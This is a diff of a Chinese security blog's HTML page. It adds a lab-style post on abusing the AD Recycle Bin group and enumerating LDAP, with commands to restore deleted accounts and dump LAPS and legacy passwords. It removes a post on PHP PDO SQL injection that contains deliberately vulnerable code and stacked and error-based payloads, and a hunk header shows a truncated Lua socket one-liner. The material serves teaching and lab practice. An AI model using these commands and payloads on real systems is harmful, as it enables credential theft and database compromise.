@@ -118,6 +118,53 @@
 <!--  <div class="project-card">
   
   <div class="ctnWrap">
+    <a href="/2020/04/26/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BAD-Recyle-Bin%E7%BB%84%E5%88%A9%E7%94%A8-Ldaps%E4%BF%A1%E6%81%AF%E6%9E%9A%E4%B8%BE/" class="title">域渗透之AD Recyle Bin组利用+Ldaps信息枚举</a>
+    <section class="desc">
+  AD Recyle Bin组利用：使用回收站还原用户，或获取用户旧密码进行碰撞
+前提,需要域内启用回收站功能，且用户在AD Recyle Bin 组中
+未启用启用回收站和启用回收站删除对象对比
+图1：启用回收站之前已删除的Active Directory对象的生命周期
+
+图2：启用回收站后已删除的Active Directory对象的生命周期
+
+启用AD回收站：
+Enable-ADOptionalFeature –Identity ‘CN=Recycle Bin Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=www,DC=domain,DC=com’ –Scope ForestOrConfigurationSet –Target ‘www.domain.com’查看删除用户
+Get-ADObject -filter &apos;isDeleted -eq $true -and name -ne &quot;Deleted Objects&quot;&apos; -includeDeletedObjects结果示例：
+Deleted           : True
+DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
+Name              : TempAdmin
+                DEL:f0cc344d-31e0-4866-bceb-a842791ca059
+ObjectClass       : user
+ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059尝试还原已删除账户
+Restore-ADObject -Identity &apos;f0cc344d-31e0-4866-bceb-a842791ca059&apos;###使用ObjectGUID进行还原或
+Get-ADObject -Filter {displayName -eq  &quot;TempAdmin&quot;} IncludeDeletedObjects | Restore-ADObject查询ms-mcs-admpwd
+Get-ADObject -ldapFilter:&quot;(msDS-LastKnownRDN=*)&quot; –IncludeDeletedObjects -Property ms-mcs-admpwd  查看有关于特定账户的全部属性信息：
+Get-ADObject -Filter {displayName -eq &quot;TempAdmin&quot;} -IncludeDeletedObjects -Properties *  
+cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz如这里存在LegacyPassword（直接缓存的旧密码）名称被自定义，通过查看所有属性列出来
+Ldap枚举：获取基本的账户信息、密码ldapsearch 使用：列出基本的上下文信息
+kali@kali:$ ldapsearch -h 10.10.10.182 -D  cascade.local -x -s base namingcontexts提取整个域目录的数据，然后grep筛选输出：
+kali@kali:$ ldapsearch -h 10.10.10.182 -D cascade.local -x -s sub -b &quot;DC=cascade,DC=local&quot; |tee ldap.out
+root@kali:$ cat ldap.out |grep -i memberof筛选输出：
+kali@kali:$ ldapsearch -h 10.10.10.182 -D cascade.local -x -b &quot;DC=cascade,DC=local&quot; &apos;(objectClass=User)&apos; sAMAccountName sAMAccountType列出管理用户组
+kali@kali:$ ldapsearch -h 10.10.10.182 -D cascade.local -x -b &quot;DC=cascae,DC=local&quot; &apos;(memberOf=CN=Remote Management Users,OU=Groups,OU=UK,DC=cascade,DC=local)&apos; |grep -i memberofDump LAPS passwords:
+kali@kali:$ ldapsearch -h  -D cascade.local -x -b &quot;dc=cascade,dc=local&quot; &apos;(ms-MCS-AdmPwd=*)&apos; ms-MCS-AdmPwd同样windapsearch也是一个不错的工具
+kali@kali:$./windapsearch_py2.py  --dc-ip 10.10.10.182 -d cascade.local --full --users
+
+...
+user:r.thompson
+cascadeLegacyPwd: clk0bjVldmE=
+...https://github.com/snovvcrash/cheatsheets/tree/master 
+https://www.lepide.com/how-to/restore-deleted-objects-in-active-directory.html 
+
+
+</section>
+    <p class="sub">Apr 26, 2020</p>
+  </div>
+</div>-->
+<!---->
+<!--  <div class="project-card">
+  
+  <div class="ctnWrap">
     <a href="/2020/04/26/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8BExchange%E6%8F%90%E6%9D%83/" class="title">域控提权之Exchange提权</a>
     <section class="desc">
   原理 ：Exchange Windows Permissions组成员在域内具有WriteDacl权限，将该组任意集成组WriteDacl权限的成员身份中继到LDAP后，可以修改域对象的ACL授予用户更高级别的访问权限，执行DCSync
@@ -773,119 +820,9 @@ lua -e &quot;require(&apos;socket&apos;);require(&apos;os&apos;);t=socket.tcp();
   </div>
 </div>-->
 <!---->
-<!--  <div class="project-card">
-  
-  <div class="ctnWrap">
-    <a href="/2020/02/21/PDO&&InjectionBypass/" class="title">PDO&amp;&amp;InjectionBypass</a>
-    <section class="desc">
-  PHP PDO &amp; Injection BypassPDO：PHP 数据对象  PHP访问数据库定义了一个轻量级的一致接口。  PDO 提供了一个数据访问抽象层，这意味着，不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据。  使用预处理和存储过程
-PDO连接MySql数据库：
-&lt;?php
-$dbms=&apos;mysql&apos;; //数据库类型
-$host=&apos;127.0.0.1&apos;; //数据库主机名
-$port=&apos;3306&apos;;  //数据库端口
-$dbName=&apos;test&apos;;//使用的数据库
-$user=&apos;root&apos;;  //数据库连接用户名
-$pass=&apos;root&apos;;  //对应的密码
-$dsn=&quot;$dbms:host=$host;port=$port;dbname=$dbName&quot;;   
-try { 
-$dbh = new PDO($dsn, $user, $pass); //初始化一个PDO对象 
-echo &quot;连接成功&lt;br/&gt;&quot;;
-/*你还可以进行一次搜索操作
-foreach ($dbh-&gt;query(&apos;SELECT * from FOO&apos;) as $row) {
-print_r($row); //你可以用 echo($GLOBAL); 来看到这些值
-}
-*/
-$dbh = null;
-} catch (PDOException $e) {
-die (&quot;Error!: &quot; . $e-&gt;getMessage() . &quot;&lt;br/&gt;&quot;);
-}
-//默认这个不是长连接，如果需要数据库长连接，需要最后加一个参数：array(PDO::ATTR_PERSISTENT =&gt; true) 变成这样：
-$db = new PDO($dsn, $user, $pass, array(PDO::ATTR_PERSISTENT =&gt; true));
-?&gt;PDO多语句安全问题：使用PDO中query()函数同数据库交互：
-&lt;?php$dbms=&apos;mysql&apos;;
-$host=&apos;127.0.0.1&apos;;
-$dbName=&apos;test&apos;;
-$user=&apos;root&apos;;
-$pass=&apos;root&apos;;
-$dsn=&quot;$dbms:host=$host;dbname=$dbName&quot;;
-try {
- $pdo = new PDO($dsn, $user, $pass);
-} catch (PDOException $e) {
- echo $e;
-}
-$sql = &quot;select * from user where id=1;&quot;;
-$sql .= &quot;create table test2 like user&quot;;
-$stmt = $pdo-&gt;query($sql);while($row=$stmt-&gt;fetch(PDO::FETCH_ASSOC))
-{
-var_dump($row);
-echo &quot;&quot;;
-}PDO默认支持多语句查询，如果php版本小于5.5.21或者创建PDO实例时未设置PDO::MYSQL_ATTR_MULTI_STATEMENTS为false时可能会造成堆叠注入
-&lt;?php
-$dbms=&apos;mysql&apos;;
-$host=&apos;127.0.0.1&apos;;
-$dbName=&apos;test&apos;;
-$user=&apos;root&apos;;
-$pass=&apos;root&apos;;
-$dsn=&quot;$dbms:host=$host;dbname=$dbName&quot;;
-try {
- $pdo = new PDO($dsn, $user, $pass);
-} 
-catch (PDOException $e) {
- echo $e;
-}
-$id = $_GET[&apos;id&apos;];
-$sql = &quot;SELECT * from user where id =&quot;.$id;
-$stmt = $pdo-&gt;query($sql);
-while($row=$stmt-&gt;fetch(PDO::FETCH_ASSOC)){
-var_dump($row);
-echo &quot;&quot;;
-}
-?&gt;$id变量可控，以形成堆叠注入
-
-禁止多语句执行：
-new PDO($dsn, $user, $pass, array( PDO::MYSQL_ATTR_MULTI_STATEMENTS =&gt; false))PDO预处理安全问题    PDO分为模拟预处理和非模拟预处理。    模拟预处理是防止某些数据库不支持预处理而设置的，在初始化PDO驱动时，可以设置一项参数,PDO::ATTR_EMULATE_PREPARES，作用是打开模拟预处理(true)或者关闭(false),默认为true。PDO内部会模拟参数绑定的过程，SQL语句是在最后execute()的时候才发送给数据库执行。    非模拟预处理则是通过数据库服务器来进行预处理动作，主要分为两步：第一步是prepare阶段，发送SQL语句模板到数据库服务器；第二步通过execute()函数发送占位符参数给数据库服务器进行执行。
-[1]模拟预处理动态拼接形成多语句执行（PHP&lt;5.3.6）
-&lt;?php
-$dbms=&apos;mysql&apos;;
-$host=&apos;127.0.0.1&apos;;
-$dbName=&apos;test&apos;;
-$user=&apos;root&apos;;
-$pass=&apos;root&apos;;
-$dsn=&quot;$dbms:host=$host;dbname=$dbName&quot;;
-try {
-$pdo = new PDO($dsn, $user, $pass);
-} catch (PDOException $e) {
-echo $e;
-}
-//$pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
-$username = $_GET[&apos;username&apos;];
-$sql = &quot;select id,&quot;.$_GET[&apos;field&apos;].&quot; from user where username = ?&quot;;
-$stmt = $pdo-&gt;prepare($sql);
-$stmt-&gt;bindParam(1,$username);
-$stmt-&gt;execute();
-while($row=$stmt-&gt;fetch(PDO::FETCH_ASSOC))
-{
-var_dump($row);
-echo &quot;
-&quot;;
-}
-?&gt;   可以看到sql语句field字段可控，这样我们构造field，达到多语句执行的效果。
-
-数据库中语句为：
-select id,username from user;create table sss like user;select id from user where username=Z[2]模拟预处理报错注入(PHP&lt;5.3.6)   上述代码，设置$pdo-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); //打印报错信息   同样可以达到报错注入效果
-在数据库中语句为：
-select id,updatexml(1,concat(user(),0x7e,version()),1) from user;select id from user where username=Z[3]非模拟预处理报错注入   设置pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false); //表示是否使用PHP本地模拟prepare   ：php对sql语句发送采用了prepare–execute方式，php对sql语句发送采用了prepare–execute方式   此时转义处理交由mysql server来执行，变量和SQL模板是分两次发送的   因此虽然field字段依旧可控，但是多语句不可执行   当设置$pdo-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);时，仍然可以进行报错注入在数据库中语句为：    select id,updatexml(1,concat(user(),0x7e),1) from user where username=Y;这里可进行报错注入是因为MySQL服务端prepare时报错，然后通过设置PDO::ATTR_ERRMODE将MySQL错误信息打印在MySQL中执行prepare语句    prepare statm from “select id,updatexml(0x7e,concat(0x7e,user(),0x7e),0x7e) from user where username=?”;
-
-
-</section>
-    <p class="sub">Feb 21, 2020</p>
-  </div>
-</div>-->
-<!---->
 <!--
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/">&lt;span class&#x3D;&quot;iconfont icon-arrow-left&quot;&gt;&lt;&#x2F;span&gt;</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+    <a class="extend prev" rel="prev" href="/">&lt;span class&#x3D;&quot;iconfont icon-arrow-left&quot;&gt;&lt;&#x2F;span&gt;</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">&lt;span class&#x3D;&quot;iconfont icon-arrow-right&quot;&gt;&lt;&#x2F;span&gt;</a>
   </nav>
 
 -->
@@ -896,6 +833,68 @@ select id,updatexml(1,concat(user(),0x7e,version()),1) from user;select id from 
     <div class="box-content flex1">
         <div class="swiper-container">
             <div class="swiper-wrapper">
+                
+                    <a title="域渗透之AD Recyle Bin组利用+Ldaps信息枚举" alt="域渗透之AD Recyle Bin组利用+Ldaps信息枚举" href="/2020/04/26/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BAD-Recyle-Bin%E7%BB%84%E5%88%A9%E7%94%A8-Ldaps%E4%BF%A1%E6%81%AF%E6%9E%9A%E4%B8%BE/"
+                       class="post-item swiper-slide flex flex-v">
+                        <div class="image">
+                            
+                                <img title="域渗透之AD Recyle Bin组利用+Ldaps信息枚举" alt="域渗透之AD Recyle Bin组利用+Ldaps信息枚举"
+                                     src="/images/default.jpg"></img>
+                            
+                        </div>
+                        <div class="content-warp flex1 flex flex-v">
+                            <div class="title">&lt; 域渗透之AD Recyle Bin组利用+Ldaps信息枚举 &gt;</div>
+                            <div class="content flex1">
+                                
+  AD Recyle Bin组利用：使用回收站还原用户，或获取用户旧密码进行碰撞
+前提,需要域内启用回收站功能，且用户在AD Recyle Bin 组中
+未启用启用回收站和启用回收站删除对象对比
+图1：启用回收站之前已删除的Active Directory对象的生命周期
+
+图2：启用回收站后已删除的Active Directory对象的生命周期
+
+启用AD回收站：
+Enable-ADOptionalFeature –Identity ‘CN=Recycle Bin Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=www,DC=domain,DC=com’ –Scope ForestOrConfigurationSet –Target ‘www.domain.com’查看删除用户
+Get-ADObject -filter &apos;isDeleted -eq $true -and name -ne &quot;Deleted Objects&quot;&apos; -includeDeletedObjects结果示例：
+Deleted           : True
+DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
+Name              : TempAdmin
+                DEL:f0cc344d-31e0-4866-bceb-a842791ca059
+ObjectClass       : user
+ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059尝试还原已删除账户
+Restore-ADObject -Identity &apos;f0cc344d-31e0-4866-bceb-a842791ca059&apos;###使用ObjectGUID进行还原或
+Get-ADObject -Filter {displayName -eq  &quot;TempAdmin&quot;} IncludeDeletedObjects | Restore-ADObject查询ms-mcs-admpwd
+Get-ADObject -ldapFilter:&quot;(msDS-LastKnownRDN=*)&quot; –IncludeDeletedObjects -Property ms-mcs-admpwd  查看有关于特定账户的全部属性信息：
+Get-ADObject -Filter {displayName -eq &quot;TempAdmin&quot;} -IncludeDeletedObjects -Properties *  
+cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz如这里存在LegacyPassword（直接缓存的旧密码）名称被自定义，通过查看所有属性列出来
+Ldap枚举：获取基本的账户信息、密码ldapsearch 使用：列出基本的上下文信息
+kali@kali:$ ldapsearch -h 10.10.10.182 -D  cascade.local -x -s base namingcontexts提取整个域目录的数据，然后grep筛选输出：
+kali@kali:$ ldapsearch -h 10.10.10.182 -D cascade.local -x -s sub -b &quot;DC=cascade,DC=local&quot; |tee ldap.out
+root@kali:$ cat ldap.out |grep -i memberof筛选输出：
+kali@kali:$ ldapsearch -h 10.10.10.182 -D cascade.local -x -b &quot;DC=cascade,DC=local&quot; &apos;(objectClass=User)&apos; sAMAccountName sAMAccountType列出管理用户组
+kali@kali:$ ldapsearch -h 10.10.10.182 -D cascade.local -x -b &quot;DC=cascae,DC=local&quot; &apos;(memberOf=CN=Remote Management Users,OU=Groups,OU=UK,DC=cascade,DC=local)&apos; |grep -i memberofDump LAPS passwords:
+kali@kali:$ ldapsearch -h  -D cascade.local -x -b &quot;dc=cascade,dc=local&quot; &apos;(ms-MCS-AdmPwd=*)&apos; ms-MCS-AdmPwd同样windapsearch也是一个不错的工具
+kali@kali:$./windapsearch_py2.py  --dc-ip 10.10.10.182 -d cascade.local --full --users
+
+...
+user:r.thompson
+cascadeLegacyPwd: clk0bjVldmE=
+...https://github.com/snovvcrash/cheatsheets/tree/master 
+https://www.lepide.com/how-to/restore-deleted-objects-in-active-directory.html 
+
+
+
+                            </div>
+                            <div class="post-tags">
+                                
+                            </div>
+                            <div class="other">
+                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
+                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
+                                <span><i class="iconfont icon-shijian"></i>Apr 26, 2020</span>
+                            </div>
+                        </div>
+                    </a>
                 
                     <a title="域控提权之Exchange提权" alt="域控提权之Exchange提权" href="/2020/04/26/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8BExchange%E6%8F%90%E6%9D%83/"
                        class="post-item swiper-slide flex flex-v">
@@ -1686,131 +1685,6 @@ lua -e &quot;require(&apos;socket&apos;);require(&apos;os&apos;);t=socket.tcp();
                                 <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                 <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                 <span><i class="iconfont icon-shijian"></i>Apr 19, 2020</span>
-                            </div>
-                        </div>
-                    </a>
-                
-                    <a title="PDO&amp;&amp;InjectionBypass" alt="PDO&amp;&amp;InjectionBypass" href="/2020/02/21/PDO&&InjectionBypass/"
-                       class="post-item swiper-slide flex flex-v">
-                        <div class="image">
-                            
-                                <img title="PDO&amp;&amp;InjectionBypass" alt="PDO&amp;&amp;InjectionBypass"
-                                     src="/images/default.jpg"></img>
-                            
-                        </div>
-                        <div class="content-warp flex1 flex flex-v">
-                            <div class="title">&lt; PDO&amp;&amp;InjectionBypass &gt;</div>
-                            <div class="content flex1">
-                                
-  PHP PDO &amp; Injection BypassPDO：PHP 数据对象  PHP访问数据库定义了一个轻量级的一致接口。  PDO 提供了一个数据访问抽象层，这意味着，不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据。  使用预处理和存储过程
-PDO连接MySql数据库：
-&lt;?php
-$dbms=&apos;mysql&apos;; //数据库类型
-$host=&apos;127.0.0.1&apos;; //数据库主机名
-$port=&apos;3306&apos;;  //数据库端口
-$dbName=&apos;test&apos;;//使用的数据库
-$user=&apos;root&apos;;  //数据库连接用户名
-$pass=&apos;root&apos;;  //对应的密码
-$dsn=&quot;$dbms:host=$host;port=$port;dbname=$dbName&quot;;   
-try { 
-$dbh = new PDO($dsn, $user, $pass); //初始化一个PDO对象 
-echo &quot;连接成功&lt;br/&gt;&quot;;
-/*你还可以进行一次搜索操作
-foreach ($dbh-&gt;query(&apos;SELECT * from FOO&apos;) as $row) {
-print_r($row); //你可以用 echo($GLOBAL); 来看到这些值
-}
-*/
-$dbh = null;
-} catch (PDOException $e) {
-die (&quot;Error!: &quot; . $e-&gt;getMessage() . &quot;&lt;br/&gt;&quot;);
-}
-//默认这个不是长连接，如果需要数据库长连接，需要最后加一个参数：array(PDO::ATTR_PERSISTENT =&gt; true) 变成这样：
-$db = new PDO($dsn, $user, $pass, array(PDO::ATTR_PERSISTENT =&gt; true));
-?&gt;PDO多语句安全问题：使用PDO中query()函数同数据库交互：
-&lt;?php$dbms=&apos;mysql&apos;;
-$host=&apos;127.0.0.1&apos;;
-$dbName=&apos;test&apos;;
-$user=&apos;root&apos;;
-$pass=&apos;root&apos;;
-$dsn=&quot;$dbms:host=$host;dbname=$dbName&quot;;
-try {
- $pdo = new PDO($dsn, $user, $pass);
-} catch (PDOException $e) {
- echo $e;
-}
-$sql = &quot;select * from user where id=1;&quot;;
-$sql .= &quot;create table test2 like user&quot;;
-$stmt = $pdo-&gt;query($sql);while($row=$stmt-&gt;fetch(PDO::FETCH_ASSOC))
-{
-var_dump($row);
-echo &quot;&quot;;
-}PDO默认支持多语句查询，如果php版本小于5.5.21或者创建PDO实例时未设置PDO::MYSQL_ATTR_MULTI_STATEMENTS为false时可能会造成堆叠注入
-&lt;?php
-$dbms=&apos;mysql&apos;;
-$host=&apos;127.0.0.1&apos;;
-$dbName=&apos;test&apos;;
-$user=&apos;root&apos;;
-$pass=&apos;root&apos;;
-$dsn=&quot;$dbms:host=$host;dbname=$dbName&quot;;
-try {
- $pdo = new PDO($dsn, $user, $pass);
-} 
-catch (PDOException $e) {
- echo $e;
-}
-$id = $_GET[&apos;id&apos;];
-$sql = &quot;SELECT * from user where id =&quot;.$id;
-$stmt = $pdo-&gt;query($sql);
-while($row=$stmt-&gt;fetch(PDO::FETCH_ASSOC)){
-var_dump($row);
-echo &quot;&quot;;
-}
-?&gt;$id变量可控，以形成堆叠注入
-
-禁止多语句执行：
-new PDO($dsn, $user, $pass, array( PDO::MYSQL_ATTR_MULTI_STATEMENTS =&gt; false))PDO预处理安全问题    PDO分为模拟预处理和非模拟预处理。    模拟预处理是防止某些数据库不支持预处理而设置的，在初始化PDO驱动时，可以设置一项参数,PDO::ATTR_EMULATE_PREPARES，作用是打开模拟预处理(true)或者关闭(false),默认为true。PDO内部会模拟参数绑定的过程，SQL语句是在最后execute()的时候才发送给数据库执行。    非模拟预处理则是通过数据库服务器来进行预处理动作，主要分为两步：第一步是prepare阶段，发送SQL语句模板到数据库服务器；第二步通过execute()函数发送占位符参数给数据库服务器进行执行。
-[1]模拟预处理动态拼接形成多语句执行（PHP&lt;5.3.6）
-&lt;?php
-$dbms=&apos;mysql&apos;;
-$host=&apos;127.0.0.1&apos;;
-$dbName=&apos;test&apos;;
-$user=&apos;root&apos;;
-$pass=&apos;root&apos;;
-$dsn=&quot;$dbms:host=$host;dbname=$dbName&quot;;
-try {
-$pdo = new PDO($dsn, $user, $pass);
-} catch (PDOException $e) {
-echo $e;
-}
-//$pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
-$username = $_GET[&apos;username&apos;];
-$sql = &quot;select id,&quot;.$_GET[&apos;field&apos;].&quot; from user where username = ?&quot;;
-$stmt = $pdo-&gt;prepare($sql);
-$stmt-&gt;bindParam(1,$username);
-$stmt-&gt;execute();
-while($row=$stmt-&gt;fetch(PDO::FETCH_ASSOC))
-{
-var_dump($row);
-echo &quot;
-&quot;;
-}
-?&gt;   可以看到sql语句field字段可控，这样我们构造field，达到多语句执行的效果。
-
-数据库中语句为：
-select id,username from user;create table sss like user;select id from user where username=Z[2]模拟预处理报错注入(PHP&lt;5.3.6)   上述代码，设置$pdo-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); //打印报错信息   同样可以达到报错注入效果
-在数据库中语句为：
-select id,updatexml(1,concat(user(),0x7e,version()),1) from user;select id from user where username=Z[3]非模拟预处理报错注入   设置pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false); //表示是否使用PHP本地模拟prepare   ：php对sql语句发送采用了prepare–execute方式，php对sql语句发送采用了prepare–execute方式   此时转义处理交由mysql server来执行，变量和SQL模板是分两次发送的   因此虽然field字段依旧可控，但是多语句不可执行   当设置$pdo-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);时，仍然可以进行报错注入在数据库中语句为：    select id,updatexml(1,concat(user(),0x7e),1) from user where username=Y;这里可进行报错注入是因为MySQL服务端prepare时报错，然后通过设置PDO::ATTR_ERRMODE将MySQL错误信息打印在MySQL中执行prepare语句    prepare statm from “select id,updatexml(0x7e,concat(0x7e,user(),0x7e),0x7e) from user where username=?”;
-
-
-
-                            </div>
-                            <div class="post-tags">
-                                
-                            </div>
-                            <div class="other">
-                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
-                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
-                                <span><i class="iconfont icon-shijian"></i>Feb 21, 2020</span>
                             </div>
                         </div>
                     </a>
